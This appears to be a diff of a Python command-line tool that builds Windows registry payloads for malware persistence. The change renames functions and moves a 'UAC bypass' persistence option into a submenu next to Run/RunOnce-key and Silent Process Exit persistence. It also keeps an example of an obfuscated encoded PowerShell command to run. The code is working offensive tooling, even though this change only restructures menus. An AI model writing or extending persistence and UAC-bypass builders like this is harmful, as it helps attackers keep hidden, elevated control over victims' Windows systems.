@@ -42,7 +42,7 @@ def sanitize_command(command):
     return command
 
 
-def set_run():
+def add_run():
     global payload
     while True:
         print("[>] Choose hive and key:")
@@ -77,32 +77,6 @@ def set_run():
         payload += template_run.format(run_hive, run_key, data_name, command)
         print("[+] Added")
         return
-
-
-def set_spe():
-    global payload
-    print("[>] Enter the process name that when exits will trigger the command (e.g. notepad.exe)")
-    process_name = input(">> ")
-    print(r"[>] Enter the command to execute (e.g. 'pOwErShElL -enc aQBlAHgAIA...')")
-    command = sanitize_command(input(">> "))
-    payload += template_spe.format(process_name, command)
-    print("[+] Added")
-
-
-def add_persistence():
-    print("[>] Choose:")
-    print("[1] Add persistence using a Run/RunOnce key")
-    print("[2] Add persistence using Silent Process Exit technique (requires admin)")
-    print("[99] Back")
-    i = int(input(">> "))
-    if i == 1:
-        set_run()
-    elif i == 2:
-        set_spe()
-    elif i == 99:
-        return
-    else:
-        print("[-] No such option :(")
 
 
 def add_uac_run():
@@ -150,6 +124,35 @@ def add_uac_run():
         payload += template_run.format("HKEY_CURRENT_USER", run_key, data_name, uac_binary)
         print("[+] Added")
         return
+
+
+def add_spe():
+    global payload
+    print("[>] Enter the process name that when exits will trigger the command (e.g. notepad.exe)")
+    process_name = input(">> ")
+    print(r"[>] Enter the command to execute (e.g. 'pOwErShElL -enc aQBlAHgAIA...')")
+    command = sanitize_command(input(">> "))
+    payload += template_spe.format(process_name, command)
+    print("[+] Added")
+
+
+def add_persistence():
+    print("[>] Choose:")
+    print("[1] Add persistence using a Run/RunOnce key")
+    print("[2] Add persistence using a Run/RunOnce key and UAC bypass")
+    print("[3] Add persistence using Silent Process Exit technique (requires admin)")
+    print("[99] Back")
+    i = int(input(">> "))
+    if i == 1:
+        add_run()
+    elif i == 2:
+        add_uac_run()
+    elif i == 3:
+        add_spe()
+    elif i == 99:
+        return
+    else:
+        print("[-] No such option :(")
 
 
 def mess_with_registry():
@@ -200,24 +203,21 @@ def main_screen():
     while True:
         print("[>] Choose:")
         print("[1] Add persistence")
-        print("[2] Add persistence with UAC bypass")
-        print("[3] Mess with registry settings")
-        print("[4] Print payload")
-        print("[5] Reset payload")
-        print("[6] Save payload")
+        print("[2] Mess with registry settings")
+        print("[3] Print payload")
+        print("[4] Reset payload")
+        print("[5] Save payload")
         print("[99] Exit")
         i = int(input(">> "))
         if i == 1:
             add_persistence()
         elif i == 2:
-            add_uac_run()
-        elif i == 3:
             mess_with_registry()
-        elif i == 4:
+        elif i == 3:
             print_payload()
-        elif i == 5:
+        elif i == 4:
             reset_payload()
-        elif i == 6:
+        elif i == 5:
             save_payload()
         elif i == 99:
             return
